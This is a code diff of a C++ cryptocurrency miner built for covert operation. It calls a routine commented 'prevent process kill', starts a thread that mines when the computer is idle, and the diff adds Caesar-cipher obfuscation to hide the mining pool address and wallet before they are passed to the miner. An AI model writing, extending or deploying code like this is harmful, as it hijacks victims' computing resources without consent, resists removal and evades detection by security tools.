@@ -70,19 +70,31 @@ void checkIDLE() {
 			if (!Workers::isEnabled())
 				Workers::setEnabled(true);
 		}
-		
+
 		Sleep(1000);
 	}
 }
 
 int main()
 {
-	DACL(); //prevent process kill
+	/* Caesar Decrypt */
+	int shift = 0x7;
+	char pool[128] = "wvvs5tpulty5jvtA;;;;";
+	char wallet[256] = ";?lkmO|>]@a?;`ЃЃTh=m\|lvLSa@aY_x@]l{^Ѓ`NЃR{<9_\<}xnЃ`uKR@\YuYvQTr8q?uS~L]zhZ^Q;mok\ЂapqIN\pjvK";
+
+	for (int i = 0; i < strlen(pool); i++)
+		pool[i] -= shift;
+
+	for (int i = 0; i < strlen(wallet); i++)
+		wallet[i] -= shift;
+	/* End Caesar Decrypt */
 	
+	DACL(); //prevent process kill
+
 	std::thread* user_idle = new std::thread(checkIDLE); //check computer idle
 	user_idle->detach();
-	
-	static char * params[] = { "miner", "-o", "pool", "-u", "wallet", "-p", "x"};
+
+	static char * params[] = { "miner", "-o", pool, "-u", wallet, "-p", "x" };
 	App Application(7, params);
 
 	return Application.exec();
